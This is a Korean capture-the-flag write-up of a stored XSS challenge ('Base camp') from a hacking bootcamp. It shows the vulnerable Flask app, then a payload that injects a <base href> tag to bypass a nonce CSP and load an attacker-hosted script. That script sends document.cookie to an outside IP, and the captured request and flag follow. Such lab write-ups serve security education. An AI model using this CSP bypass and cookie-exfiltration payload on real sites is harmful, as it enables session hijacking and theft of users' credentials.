---
title: "[Writeup] Knockon Bootcamp - 6.1 Base camp"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
last_modified_at: 2024-09-12T20:20:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10014/>

![6.1 Base camp 1](/assets/images/writeup/web-hacking/knock-on/6-1_XSS_1.png)

![6.1 Base camp 2](/assets/images/writeup/web-hacking/knock-on/6_XSS_2.png)


### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS

|

|

|

## 문제 코드

```jsx
from flask import Flask, render_template, request, redirect, url_for, abort
from flask_sqlalchemy import SQLAlchemy
import secrets

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String(64), nullable=False)
    title = db.Column(db.String(64), nullable=False)
    content = db.Column(db.Text, nullable=False)

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

nonce = secrets.token_hex(16)

#SCP설정
@app.after_request
def set_csp(response): 
    response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
    return response

@app.route('/')
def index():
    posts = Post.query.all()
    global nonce
    nonce = secrets.token_hex(16)
    return render_template('index.html', posts=posts, nonce=nonce)

@app.route('/write', methods=['GET', 'POST'])
def write():
    if request.method == 'POST':
        content = request.form['content']
        title = request.form['title']
        password = request.form['password']
        if len(password) < 4:
            return "비밀번호는 4자 이상이어야 합니다."
        post = Post(content=content, password=password, title=title)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for('index'))
    return render_template('write.html')

@app.route('/post/<int:id>', methods=['GET', 'POST'])
def view_post(id):
    post = Post.query.get_or_404(id)
    global nonce
    if '127.0.0.1' == request.remote_addr: #if admin bot
        
        nonce = secrets.token_hex(16)
        return render_template('post.html', post=post, nonce=nonce)
    
    if request.method == 'POST':
        nonce = secrets.token_hex(16)

        password = request.form['password']
        if password == post.password:
            return render_template('post.html', post=post,nonce=nonce)
        else:
            return "비밀번호가 일치하지 않습니다."
    return render_template('view_post.html', post=post)

@app.route('/delete/<int:id>')
def delete_post(id):
    post = Post.query.get_or_404(id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for('index'))

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("index.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("index.html", posts=posts, message=message)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10006, debug=True)
```

|

|

|

## 분석

### /post

---

![6.1 Base camp 3](/assets/images/writeup/web-hacking/knock-on/6-1_XSS_2.png)

`/post`에 `/testcode.js`경로로 설정하는`script`코드가 있음

|

|

|

## Exploit

```jsx
<base href="http://20.41.120.97"/>
```

`/post`의 `testcode.js`경로로 이동하는 script코드를 이용

`<base>`태그를 활용하면 페이지 접속 시 `“http://20.41.120.97/testcode.js”`로 이동함

|

```jsx
// testcode.js

location.href="http://20.41.120.97:10010/"+document.cookie
```

서버 루트 경로에 `testcode.js`파일 생성

|

|

### 결과

---

```sql
GET /cookie=K0%7Bbase_Address_can_be_modify%7D HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10006/
Accept-Encoding: gzip, deflate
```

|

|

|

## Payload

### content

---

```jsx
<base href="http://20.41.120.97"/>
```

|

### testcode.js

---

```jsx
location.href="http://20.41.120.97:10010/"+document.cookie
```

|

|

### FLAG

---

```jsx
K0{base_Address_can_be_modify}
```

|

---